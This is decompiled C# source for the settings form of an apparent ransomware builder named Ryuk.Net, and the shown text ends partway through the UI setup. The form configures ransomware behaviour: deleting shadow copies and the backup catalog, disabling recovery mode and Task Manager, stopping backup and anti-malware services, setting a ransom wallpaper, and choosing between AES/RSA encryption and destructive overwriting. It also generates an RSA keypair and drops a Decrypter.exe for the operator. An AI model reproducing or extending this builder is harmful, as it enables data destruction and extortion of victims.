using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Xml.Serialization;
using CustomWindowsForm;
using Ryuk.Net.Properties;

namespace Ryuk.Net;

public class advancedSettingForm : Form
{
	private bool mouseDown;

	private Point lastLocation;

	private IContainer components;

	private Panel panel1;

	private ButtonZ buttonZ1;

	private CheckBox deleteBackupCatalogCheckbox;

	private CheckBox disableRecoveryModeCheckbox;

	private CheckBox deleteShadowCopiesCheckbox;

	private CheckBox resistAdminCheckbox;

	private Label label1;

	private OpenFileDialog openFileDialog1;

	private Label pathToXmlLabel;

	private Button button2;

	private TextBox textBox1;

	private Label label2;

	private Label label3;

	private TextBox pathToImageText;

	private Button button1;

	private RadioButton radioButton2;

	private RadioButton radioButton1;

	private Label overwriteInfoLabel;

	private CheckBox taskManager;

	private CheckBox stopBackupsCheckbox;

	public advancedSettingForm()
	{
		InitializeComponent();
	}

	private void advancedSettingForm_Load(object sender, EventArgs e)
	{
		resistAdminCheckbox.Checked = Settings.Default.checkAdminPrivilage;
		_ = Settings.Default.encryptOption;
		string decrypterName = Settings.Default.decrypterName;
		if (decrypterName == "")
		{
			((Control)textBox1).Enabled = true;
		}
		else
		{
			((Control)textBox1).Text = decrypterName;
			((Control)textBox1).Enabled = false;
			((Control)button2).Text = "Public key selected";
		}
		string pathToBase = Settings.Default.pathToBase64;
		if (pathToBase != "")
		{
			((Control)pathToImageText).Text = pathToBase;
		}
	}

	private void buttonZ1_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void advancedSettingForm_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDown = true;
		lastLocation = e.Location;
	}

	private void advancedSettingForm_MouseMove(object sender, MouseEventArgs e)
	{
		if (mouseDown)
		{
			int x = ((Form)this).Location.X - lastLocation.X + e.X;
			int y = ((Form)this).Location.Y - lastLocation.Y + e.Y;
			((Form)this).Location = new Point(x, y);
			((Control)this).Update();
		}
	}

	private void advancedSettingForm_MouseUp(object sender, MouseEventArgs e)
	{
		mouseDown = false;
	}

	private void buttonZ1_Click_1(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void resistAdminCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (resistAdminCheckbox.Checked)
		{
			Settings.Default.checkAdminPrivilage = true;
			((Control)deleteShadowCopiesCheckbox).Enabled = true;
			((Control)disableRecoveryModeCheckbox).Enabled = true;
			((Control)deleteBackupCatalogCheckbox).Enabled = true;
			deleteShadowCopiesCheckbox.Checked = true;
			disableRecoveryModeCheckbox.Checked = true;
			deleteBackupCatalogCheckbox.Checked = true;
			taskManager.Checked = true;
			((Control)taskManager).Enabled = true;
			stopBackupsCheckbox.Checked = true;
			((Control)stopBackupsCheckbox).Enabled = true;
		}
		else
		{
			Settings.Default.checkAdminPrivilage = false;
			((Control)deleteShadowCopiesCheckbox).Enabled = false;
			((Control)disableRecoveryModeCheckbox).Enabled = false;
			((Control)deleteBackupCatalogCheckbox).Enabled = false;
			deleteShadowCopiesCheckbox.Checked = false;
			disableRecoveryModeCheckbox.Checked = false;
			deleteBackupCatalogCheckbox.Checked = false;
			taskManager.Checked = false;
			((Control)taskManager).Enabled = false;
			stopBackupsCheckbox.Checked = false;
			((Control)stopBackupsCheckbox).Enabled = false;
		}
	}

	private void panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	private void panel1_MouseMove(object sender, MouseEventArgs e)
	{
		if (mouseDown)
		{
			int x = ((Form)this).Location.X - lastLocation.X + e.X;
			int y = ((Form)this).Location.Y - lastLocation.Y + e.Y;
			((Form)this).Location = new Point(x, y);
			((Control)this).Update();
		}
	}

	private void panel1_MouseUp(object sender, MouseEventArgs e)
	{
		mouseDown = false;
	}

	private void panel1_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDown = true;
		lastLocation = e.Location;
	}

	private void deleteShadowCopiesCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (deleteShadowCopiesCheckbox.Checked)
		{
			Settings.Default.deleteShadowCopies = true;
		}
		else
		{
			Settings.Default.deleteShadowCopies = false;
		}
	}

	private void deleteBackupCatalogCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (deleteBackupCatalogCheckbox.Checked)
		{
			Settings.Default.deleteBackupCatalog = true;
		}
		else
		{
			Settings.Default.deleteBackupCatalog = false;
		}
	}

	private void disableRecoveryModeCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (disableRecoveryModeCheckbox.Checked)
		{
			Settings.Default.disableRecoveryMode = true;
		}
		else
		{
			Settings.Default.disableRecoveryMode = false;
		}
	}

	private void radioButton1_CheckedChanged(object sender, EventArgs e)
	{
		((Control)button2).Visible = true;
		((Control)textBox1).Visible = true;
		((Control)label2).Visible = true;
		((Control)overwriteInfoLabel).Text = "This function works faster but files cannot be returned ";
		Settings.Default.encryptOption = false;
	}

	private void radioButton2_CheckedChanged(object sender, EventArgs e)
	{
		((Control)button2).Visible = true;
		((Control)textBox1).Visible = true;
		((Control)label2).Visible = true;
		((Control)overwriteInfoLabel).Text = "Files will be encrypted with AES / RSA method ";
		Settings.Default.encryptOption = true;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		((FileDialog)val).FilterIndex = 1;
		if ((int)((CommonDialog)val).ShowDialog() == 1)
		{
			string fileName = ((FileDialog)val).FileName;
			((Control)textBox1).Text = Path.GetFileName(fileName);
			MessageBox.Show(fileName);
		}
	}

	private void decrypter(string decrypter)
	{
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Unknown result type (might be due to invalid IL or missing references)
		//IL_019a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0224: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_030a: Unknown result type (might be due to invalid IL or missing references)
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		RSAParameters publicKey = rSACryptoServiceProvider.ExportParameters(includePrivateParameters: true);
		string keyString = GetKeyString(rSACryptoServiceProvider.ExportParameters(includePrivateParameters: false));
		string keyString2 = GetKeyString(publicKey);
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		if (((Control)textBox1).Text.Contains("-decrypter"))
		{
			string text = ((Control)textBox1).Text;
			if (text == "")
			{
				MessageBox.Show("Decrypter name field is empty!");
				return;
			}
			if (Directory.Exists(text))
			{
				Settings.Default.publicKey = File.ReadAllText(directoryName + "\\" + text + "\\publicKey.apt22");
				Settings.Default.decrypterName = text;
				MessageBox.Show("Public key selected successfully!");
				((Control)textBox1).Text = text;
				((Control)textBox1).Enabled = false;
				((Control)button2).Text = "Public key selected";
				return;
			}
			try
			{
				Directory.CreateDirectory(text);
				string path = directoryName + "\\" + text + "\\publicKey.apt22";
				string path2 = directoryName + "\\" + text + "\\privateKey.apt22";
				File.WriteAllText(path, keyString);
				File.WriteAllText(path2, keyString2);
				byte[] bytes = Resources.decrypter;
				File.WriteAllBytes(directoryName + "\\" + text + "\\Decrypter.exe", bytes);
				Settings.Default.publicKey = File.ReadAllText(path);
				Settings.Default.decrypterName = text;
				MessageBox.Show("Decrypter created and public key selected successfully. Don't delete or move private key! Without private key files cannot be returned");
				((Control)textBox1).Text = text;
				((Control)textBox1).Enabled = false;
				((Control)button2).Text = "Public key selected";
				return;
			}
			catch
			{
				MessageBox.Show("Unexpected error occured");
				return;
			}
		}
		string text2 = ((Control)textBox1).Text + "-decrypter";
		if (text2 == "-decrypter")
		{
			MessageBox.Show("Decrypter name field is empty!");
			return;
		}
		if (Directory.Exists(text2) || Directory.Exists(text2 + "-decrypter"))
		{
			Settings.Default.publicKey = File.ReadAllText(directoryName + "\\" + text2 + "\\publicKey.apt22");
			Settings.Default.decrypterName = text2;
			MessageBox.Show("Decrypter exists. Public key selected successfully!");
			((Control)textBox1).Text = text2;
			((Control)textBox1).Enabled = false;
			((Control)button2).Text = "Public key selected";
			return;
		}
		try
		{
			Directory.CreateDirectory(text2);
			string path3 = directoryName + "\\" + text2 + "\\publicKey.apt22";
			string path4 = directoryName + "\\" + text2 + "\\privateKey.apt22";
			File.WriteAllText(path3, keyString);
			File.WriteAllText(path4, keyString2);
			byte[] bytes2 = Resources.decrypter;
			File.WriteAllBytes(directoryName + "\\" + text2 + "\\Decrypter.exe", bytes2);
			Settings.Default.publicKey = File.ReadAllText(path3);
			Settings.Default.decrypterName = text2;
			MessageBox.Show("Decrypter created and public key selected successfully. Don't delete or move private key! Without private key files cannot be returned");
			((Control)textBox1).Text = text2;
			((Control)textBox1).Enabled = false;
			((Control)button2).Text = "Public key selected";
		}
		catch
		{
			MessageBox.Show("Unexpected error occured");
		}
	}

	public static string GetKeyString(RSAParameters publicKey)
	{
		StringWriter stringWriter = new StringWriter();
		new XmlSerializer(typeof(RSAParameters)).Serialize(stringWriter, publicKey);
		return stringWriter.ToString();
	}

	private void pathToXmlLabel_Click(object sender, EventArgs e)
	{
	}

	private void overwriteInfoLabel_Click(object sender, EventArgs e)
	{
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	private void button1_Click_1(object sender, EventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Invalid comparison between Unknown and I4
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		try
		{
			OpenFileDialog val = new OpenFileDialog();
			((FileDialog)val).Filter = "Image Files(*.jpg; *.jpeg; *.gif; *.bmp)|*.jpg; *.jpeg; *.gif; *.bmp";
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				((Control)pathToImageText).Text = ((FileDialog)val).FileName;
				string text = Convert.ToBase64String(File.ReadAllBytes(((FileDialog)val).FileName));
				Settings.Default.base64Image = text;
				Settings.Default.pathToBase64 = ((FileDialog)val).FileName;
				File.WriteAllText(folderPath + "/sdf.txt", text);
			}
		}
		catch (Exception)
		{
			throw new ApplicationException("Failed loading image");
		}
	}

	private void taskManager_CheckedChanged(object sender, EventArgs e)
	{
		if (taskManager.Checked)
		{
			Settings.Default.disableTaskManager = true;
		}
		else
		{
			Settings.Default.disableTaskManager = false;
		}
	}

	private void stopBackupsCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (stopBackupsCheckbox.Checked)
		{
			Settings.Default.stopBackupServices = true;
		}
		else
		{
			Settings.Default.stopBackupServices = false;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_02ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0303: Expected O, but got Unknown
		//IL_0310: Unknown result type (might be due to invalid IL or missing references)
		//IL_031a: Expected O, but got Unknown
		//IL_0327: Unknown result type (might be due to invalid IL or missing references)
		//IL_0331: Expected O, but got Unknown
		//IL_033e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0348: Expected O, but got Unknown
		//IL_03a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_046b: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0505: Expected O, but got Unknown
		//IL_0536: Unknown result type (might be due to invalid IL or missing references)
		//IL_05cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0642: Unknown result type (might be due to invalid IL or missing references)
		//IL_064c: Expected O, but got Unknown
		//IL_0680: Unknown result type (might be due to invalid IL or missing references)
		//IL_0710: Unknown result type (might be due to invalid IL or missing references)
		//IL_071a: Expected O, but got Unknown
		//IL_074b: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0885: Unknown result type (might be due to invalid IL or missing references)
		//IL_088f: Expected O, but got Unknown
		//IL_08c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0953: Unknown result type (might be due to invalid IL or missing references)
		//IL_095d: Expected O, but got Unknown
		//IL_098e: Unknown result type (might be due to invalid IL or missing references)
		//IL_09fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a08: Expected O, but got Unknown
		//IL_0a39: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ad3: Expected O, but got Unknown
		//IL_0b07: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ba3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bad: Expected O, but got Unknown
		//IL_0bde: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c6e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c78: Expected O, but got Unknown
		//IL_0ca5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d45: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d4f: Expected O, but got Unknown
		//IL_0d7f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e8d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f57: Unknown result type (might be due to invalid IL or missing references)
		//IL_1021: Unknown result type (might be due to invalid IL or missing references)
		//IL_10c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_10cb: Expected O, but got Unknown
		//IL_10f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_11d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1221: Unknown result type (might be due to invalid IL or missing references)
		//IL_122b: Expected O, but got Unknown
		//IL_1233: Unknown result type (might be due to invalid IL or missing references)
		//IL_123d: Expected O, but got Unknown
		//IL_1245: Unknown result type (might be due to invalid IL or missing references)
		//IL_124f: Expected O, but got Unknown
		panel1 = new Panel();
		stopBackupsCheckbox = new CheckBox();
		taskManager = new CheckBox();
		label3 = new Label();
		pathToImageText = new TextBox();
		button1 = new Button();
		label2 = new Label();
		textBox1 = new TextBox();
		button2 = new Button();
		pathToXmlLabel = new Label();
		overwriteInfoLabel = new Label();
		radioButton2 = new RadioButton();
		radioButton1 = new RadioButton();
		label1 = new Label();
		buttonZ1 = new ButtonZ();
		deleteBackupCatalogCheckbox = new CheckBox();
		disableRecoveryModeCheckbox = new CheckBox();
		deleteShadowCopiesCheckbox = new CheckBox();
		resistAdminCheckbox = new CheckBox();
		openFileDialog1 = new OpenFileDialog();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)panel1).BackColor = Color.FromArgb(30, 30, 30);
		((Control)panel1).Controls.Add((Control)(object)stopBackupsCheckbox);
		((Control)panel1).Controls.Add((Control)(object)taskManager);
		((Control)panel1).Controls.Add((Control)(object)label3);
		((Control)panel1).Controls.Add((Control)(object)pathToImageText);
		((Control)panel1).Controls.Add((Control)(object)button1);
		((Control)panel1).Controls.Add((Control)(object)label2);
		((Control)panel1).Controls.Add((Control)(object)textBox1);
		((Control)panel1).Controls.Add((Control)(object)button2);
		((Control)panel1).Controls.Add((Control)(object)pathToXmlLabel);
		((Control)panel1).Controls.Add((Control)(object)overwriteInfoLabel);
		((Control)panel1).Controls.Add((Control)(object)radioButton2);
		((Control)panel1).Controls.Add((Control)(object)radioButton1);
		((Control)panel1).Controls.Add((Control)(object)label1);
		((Control)panel1).Controls.Add((Control)(object)buttonZ1);
		((Control)panel1).Controls.Add((Control)(object)deleteBackupCatalogCheckbox);
		((Control)panel1).Controls.Add((Control)(object)disableRecoveryModeCheckbox);
		((Control)panel1).Controls.Add((Control)(object)deleteShadowCopiesCheckbox);
		((Control)panel1).Controls.Add((Control)(object)resistAdminCheckbox);
		((Control)panel1).Location = new Point(3, 2);
		((Control)panel1).Margin = new Padding(4, 5, 4, 5);
		((Control)panel1).Name = "panel1";
		((Control)panel1).Size = new Size(528, 706);
		((Control)panel1).TabIndex = 11;
		((Control)panel1).Paint += new PaintEventHandler(panel1_Paint);
		((Control)panel1).MouseDown += new MouseEventHandler(panel1_MouseDown);
		((Control)panel1).MouseMove += new MouseEventHandler(panel1_MouseMove);
		((Control)panel1).MouseUp += new MouseEventHandler(panel1_MouseUp);
		((Control)stopBackupsCheckbox).AutoSize = true;
		((Control)stopBackupsCheckbox).Cursor = Cursors.Hand;
		((Control)stopBackupsCheckbox).Enabled = false;
		((Control)stopBackupsCheckbox).ForeColor = Color.White;
		((Control)stopBackupsCheckbox).Location = new Point(105, 346);
		((Control)stopBackupsCheckbox).Margin = new Padding(4, 5, 4, 5);
		((Control)stopBackupsCheckbox).Name = "stopBackupsCheckbox";
		((Control)stopBackupsCheckbox).Size = new Size(310, 24);
		((Control)stopBackupsCheckbox).TabIndex = 35;
		((Control)stopBackupsCheckbox).Text = "Stop backup and anti malware services";
		((ButtonBase)stopBackupsCheckbox).UseVisualStyleBackColor = true;
		stopBackupsCheckbox.CheckedChanged += stopBackupsCheckbox_CheckedChanged;
		((Control)taskManager).AutoSize = true;
		((Control)taskManager).Cursor = Cursors.Hand;
		((Control)taskManager).Enabled = false;
		((Control)taskManager).ForeColor = Color.White;
		((Control)taskManager).Location = new Point(105, 291);
		((Control)taskManager).Margin = new Padding(4, 5, 4, 5);
		((Control)taskManager).Name = "taskManager";
		((Control)taskManager).Size = new Size(189, 24);
		((Control)taskManager).TabIndex = 34;
		((Control)taskManager).Text = "Disable task manager";
		((ButtonBase)taskManager).UseVisualStyleBackColor = true;
		taskManager.CheckedChanged += taskManager_CheckedChanged;
		((Control)label3).AutoSize = true;
		((Control)label3).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)label3).ForeColor = Color.White;
		((Control)label3).Location = new Point(28, 425);
		((Control)label3).Margin = new Padding(4, 0, 4, 0);
		((Control)label3).Name = "label3";
		((Control)label3).Size = new Size(244, 25);
		((Control)label3).TabIndex = 33;
		((Control)label3).Text = "Change desktop wallpaper";
		((Control)pathToImageText).BackColor = Color.FromArgb(30, 30, 30);
		((Control)pathToImageText).ForeColor = Color.White;
		((Control)pathToImageText).Location = new Point(32, 460);
		((Control)pathToImageText).Margin = new Padding(4, 5, 4, 5);
		((Control)pathToImageText).Name = "pathToImageText";
		((Control)pathToImageText).Size = new Size(306, 26);
		((Control)pathToImageText).TabIndex = 32;
		((Control)button1).BackColor = Color.FromArgb(30, 30, 30);
		((Control)button1).Cursor = Cursors.Hand;
		((Control)button1).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)button1).ForeColor = Color.White;
		((Control)button1).Location = new Point(348, 454);
		((Control)button1).Margin = new Padding(4, 5, 4, 5);
		((Control)button1).Name = "button1";
		((Control)button1).Size = new Size(165, 40);
		((Control)button1).TabIndex = 31;
		((Control)button1).Text = "Select Image";
		((ButtonBase)button1).UseVisualStyleBackColor = false;
		((Control)button1).Click += button1_Click_1;
		((Control)label2).AutoSize = true;
		((Control)label2).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)label2).ForeColor = Color.White;
		((Control)label2).Location = new Point(28, 602);
		((Control)label2).Margin = new Padding(4, 0, 4, 0);
		((Control)label2).Name = "label2";
		((Control)label2).Size = new Size(153, 25);
		((Control)label2).TabIndex = 30;
		((Control)label2).Text = "Decrypter Name";
		((Control)label2).Click += label2_Click;
		((Control)textBox1).BackColor = Color.FromArgb(30, 30, 30);
		((Control)textBox1).ForeColor = Color.White;
		((Control)textBox1).Location = new Point(33, 631);
		((Control)textBox1).Margin = new Padding(4, 5, 4, 5);
		((Control)textBox1).Name = "textBox1";
		((Control)textBox1).Size = new Size(236, 26);
		((Control)textBox1).TabIndex = 29;
		((Control)textBox1).TextChanged += textBox1_TextChanged;
		((Control)button2).BackColor = Color.FromArgb(30, 30, 30);
		((Control)button2).Cursor = Cursors.Hand;
		((Control)button2).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)button2).ForeColor = Color.White;
		((Control)button2).Location = new Point(309, 622);
		((Control)button2).Margin = new Padding(4, 5, 4, 5);
		((Control)button2).Name = "button2";
		((Control)button2).Size = new Size(204, 40);
		((Control)button2).TabIndex = 28;
		((Control)button2).Text = "Create Decrypter";
		((ButtonBase)button2).UseVisualStyleBackColor = false;
		((Control)button2).Click += button2_Click;
		((Control)pathToXmlLabel).AutoSize = true;
		((Control)pathToXmlLabel).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)pathToXmlLabel).ForeColor = Color.White;
		((Control)pathToXmlLabel).Location = new Point(36, 546);
		((Control)pathToXmlLabel).Margin = new Padding(4, 0, 4, 0);
		((Control)pathToXmlLabel).Name = "pathToXmlLabel";
		((Control)pathToXmlLabel).Size = new Size(0, 25);
		((Control)pathToXmlLabel).TabIndex = 26;
		((Control)pathToXmlLabel).Click += pathToXmlLabel_Click;
		((Control)overwriteInfoLabel).AutoSize = true;
		((Control)overwriteInfoLabel).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)overwriteInfoLabel).ForeColor = Color.White;
		((Control)overwriteInfoLabel).Location = new Point(33, 562);
		((Control)overwriteInfoLabel).Margin = new Padding(4, 0, 4, 0);
		((Control)overwriteInfoLabel).Name = "overwriteInfoLabel";
		((Control)overwriteInfoLabel).Size = new Size(404, 25);
		((Control)overwriteInfoLabel).TabIndex = 24;
		((Control)overwriteInfoLabel).Text = "Files will be encrypted with AES/RSA method";
		((Control)overwriteInfoLabel).Click += overwriteInfoLabel_Click;
		((Control)radioButton2).AutoSize = true;
		radioButton2.Checked = true;
		((Control)radioButton2).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)radioButton2).ForeColor = Color.White;
		((Control)radioButton2).Location = new Point(309, 531);
		((Control)radioButton2).Margin = new Padding(4, 5, 4, 5);
		((Control)radioButton2).Name = "radioButton2";
		((Control)radioButton2).Size = new Size(211, 29);
		((Control)radioButton2).TabIndex = 23;
		radioButton2.TabStop = true;
		((Control)radioButton2).Text = "Encrypt  AES / RSA";
		((ButtonBase)radioButton2).UseVisualStyleBackColor = true;
		radioButton2.CheckedChanged += radioButton2_CheckedChanged;
		((Control)radioButton1).AutoSize = true;
		((Control)radioButton1).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)radioButton1).ForeColor = Color.White;
		((Control)radioButton1).Location = new Point(45, 531);
		((Control)radioButton1).Margin = new Padding(4, 5, 4, 5);
		((Control)radioButton1).Name = "radioButton1";
		((Control)radioButton1).Size = new Size(183, 29);
		((Control)radioButton1).TabIndex = 22;
		((Control)radioButton1).Text = "Overwrite all files";
		((ButtonBase)radioButton1).UseVisualStyleBackColor = true;
		radioButton1.CheckedChanged += radioButton1_CheckedChanged;
		((Control)label1).AutoSize = true;
		((Control)label1).Font = new Font("Microsoft Sans Serif", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label1).ForeColor = Color.White;
		((Control)label1).Location = new Point(8, 12);
		((Control)label1).Margin = new Padding(4, 0, 4, 0);
		((Control)label1).Name = "label1";
		((Control)label1).Size = new Size(446, 47);
		((Control)label1).TabIndex = 21;
		((Control)label1).Text = "Decrypter and options";
		((Control)buttonZ1).Anchor = (AnchorStyles)9;
		buttonZ1.BZBackColor = Color.FromArgb(30, 30, 30);
		buttonZ1.DisplayText = "X";
		((ButtonBase)buttonZ1).FlatStyle = (FlatStyle)0;
		((Control)buttonZ1).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)buttonZ1).ForeColor = Color.White;
		((Control)buttonZ1).Location = new Point(482, 0);
		((Control)buttonZ1).Margin = new Padding(4, 5, 4, 5);
		buttonZ1.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		buttonZ1.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)buttonZ1).Name = "buttonZ1";
		((Control)buttonZ1).Size = new Size(46, 37);
		((Control)buttonZ1).TabIndex = 20;
		((Control)buttonZ1).Text = "X";
		buttonZ1.TextLocation_X = 6;
		buttonZ1.TextLocation_Y = 1;
		((ButtonBase)buttonZ1).UseVisualStyleBackColor = true;
		((Control)buttonZ1).Click += buttonZ1_Click_1;
		((Control)deleteBackupCatalogCheckbox).AutoSize = true;
		((Control)deleteBackupCatalogCheckbox).Cursor = Cursors.Hand;
		((Control)deleteBackupCatalogCheckbox).Enabled = false;
		((Control)deleteBackupCatalogCheckbox).ForeColor = Color.White;
		((Control)deleteBackupCatalogCheckbox).Location = new Point(105, 185);
		((Control)deleteBackupCatalogCheckbox).Margin = new Padding(4, 5, 4, 5);
		((Control)deleteBackupCatalogCheckbox).Name = "deleteBackupCatalogCheckbox";
		((Control)deleteBackupCatalogCheckbox).Size = new Size(221, 24);
		((Control)deleteBackupCatalogCheckbox).TabIndex = 19;
		((Control)deleteBackupCatalogCheckbox).Text = "Delete the backup catalog";
		((ButtonBase)deleteBackupCatalogCheckbox).UseVisualStyleBackColor = true;
		deleteBackupCatalogCheckbox.CheckedChanged += deleteBackupCatalogCheckbox_CheckedChanged;
		((Control)disableRecoveryModeCheckbox).AutoSize = true;
		((Control)disableRecoveryModeCheckbox).Cursor = Cursors.Hand;
		((Control)disableRecoveryModeCheckbox).Enabled = false;
		((Control)disableRecoveryModeCheckbox).ForeColor = Color.White;
		((Control)disableRecoveryModeCheckbox).Location = new Point(105, 238);
		((Control)disableRecoveryModeCheckbox).Margin = new Padding(4, 5, 4, 5);
		((Control)disableRecoveryModeCheckbox).Name = "disableRecoveryModeCheckbox";
		((Control)disableRecoveryModeCheckbox).Size = new Size(259, 24);
		((Control)disableRecoveryModeCheckbox).TabIndex = 18;
		((Control)disableRecoveryModeCheckbox).Text = "Disable windows recovery mode";
		((ButtonBase)disableRecoveryModeCheckbox).UseVisualStyleBackColor = true;
		disableRecoveryModeCheckbox.CheckedChanged += disableRecoveryModeCheckbox_CheckedChanged;
		((Control)deleteShadowCopiesCheckbox).AutoSize = true;
		((Control)deleteShadowCopiesCheckbox).Cursor = Cursors.Hand;
		((Control)deleteShadowCopiesCheckbox).Enabled = false;
		((Control)deleteShadowCopiesCheckbox).ForeColor = Color.White;
		((Control)deleteShadowCopiesCheckbox).Location = new Point(105, 129);
		((Control)deleteShadowCopiesCheckbox).Margin = new Padding(4, 5, 4, 5);
		((Control)deleteShadowCopiesCheckbox).Name = "deleteShadowCopiesCheckbox";
		((Control)deleteShadowCopiesCheckbox).Size = new Size(282, 24);
		((Control)deleteShadowCopiesCheckbox).TabIndex = 17;
		((Control)deleteShadowCopiesCheckbox).Text = "Delete all Volumes Shadow Copies";
		((ButtonBase)deleteShadowCopiesCheckbox).UseVisualStyleBackColor = true;
		deleteShadowCopiesCheckbox.CheckedChanged += deleteShadowCopiesCheckbox_CheckedChanged;
		((Control)resistAdminCheckbox).AutoSize = true;
		((Control)resistAdminCheckbox).Cursor = Cursors.Hand;
		((Control)resistAdminCheckbox).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
